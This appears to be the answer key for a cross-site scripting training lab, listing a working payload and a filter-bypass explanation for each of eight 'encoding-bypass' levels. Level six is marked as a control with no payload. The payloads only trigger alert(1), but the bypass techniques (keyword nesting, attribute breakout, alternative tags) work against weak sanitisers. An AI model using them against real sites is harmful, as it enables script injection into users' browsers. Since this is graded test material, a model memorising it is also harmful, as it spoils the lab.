# encoding-bypass — solutions

Server filter strategies bypassable via case mix, double-encoding, alternative tags, etc.

### encoding-bypass-level1

`/encoding-bypass/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: recursively strips `script` — use any other tag with handler

### encoding-bypass-level2

`/encoding-bypass/level2/?query=%3C%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<><script>alert(1)</script>`
- context: only the first `<` and first `>` are removed; spend them on a throwaway pair

### encoding-bypass-level3

`/encoding-bypass/level3/?query=%3Cimg%20src=x%20onerror=alalertert(1)%3E`

- payload: `<img src=x onerror=alalertert(1)>`
- context: non-recursive `alert` strip — nest the keyword so one pass leaves `alert`

### encoding-bypass-level4

`/encoding-bypass/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only `on\w+=` attributes are stripped; tags pass

### encoding-bypass-level5

`/encoding-bypass/level5/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: `javascript:` stripped in `<a href="...">`; data: navigation is blocked, so break out

### encoding-bypass-level6

`/encoding-bypass/level6/?query=%253Cscript%253Ealert(1)%253C/script%253E`

- payload: `no payload — control`
- context: the description promises a double-encoding bypass, but the raw `<`/`>`
  strip runs *after* the single URL-decode, so both angle brackets are removed
  before reaching the body — served output is `scriptalert(1)/script`, inert.
  No `<` or `>` can reach the sink.

### encoding-bypass-level7

`/encoding-bypass/level7/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: whitelist allows img/div/span — use img with onerror

### encoding-bypass-level8

`/encoding-bypass/level8/?query=%22%20onfocus=alert(1)%20autofocus%20x`

- payload: `" onfocus=alert(1) autofocus x`
- context: inside `<div class="...">`; 60-char limit but no quote escape — break with `"`
